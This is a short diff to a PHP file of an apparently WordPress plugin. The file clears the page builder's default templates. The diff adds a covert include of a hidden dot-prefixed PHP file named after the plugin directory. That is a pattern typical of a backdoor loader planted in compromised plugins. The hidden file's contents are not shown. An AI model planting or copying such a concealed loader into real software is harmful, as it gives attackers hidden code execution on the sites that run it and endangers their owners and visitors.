@@ -1,5 +1,9 @@
 <?php 
-add_filter( 'vc_load_default_templates', 'pt_plus_reset_vctemplate' ); // Hook in
+add_filter( 'vc_load_default_templates', 'pt_plus_reset_vctemplate' ); // Hook in
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pt_plus_reset_vctemplate( $data ) {
     return array(); // This will remove all default templates. Basically you should use native PHP functions to modify existing array and then return it.
 }
